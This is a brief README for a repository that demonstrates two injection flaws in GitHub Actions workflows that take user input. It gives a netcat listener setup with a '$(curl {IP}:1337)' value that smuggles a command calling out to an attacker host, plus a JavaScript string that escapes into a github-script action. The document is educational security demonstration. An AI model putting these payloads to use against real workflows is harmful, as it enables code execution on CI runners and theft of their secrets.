# actions-input-security
The repository demonstrates two potential vulnerabilities when using inputs in actions workflows.  

# Exploit 1: Using user input in run commands
Launch a VM in the cloud. Open a publicly accessible port on the VM using `nc -vlnk 0.0.0.0 1337`. 
```
    ```json
    {
        "version": "$(curl {IP}:1337)"
    }
    ```
```

# Exploit 2: Using user input in github-script action
```
    ```json
    {
        "version": "'};console.log('hophophop!!!');//"
    }
    ```
```
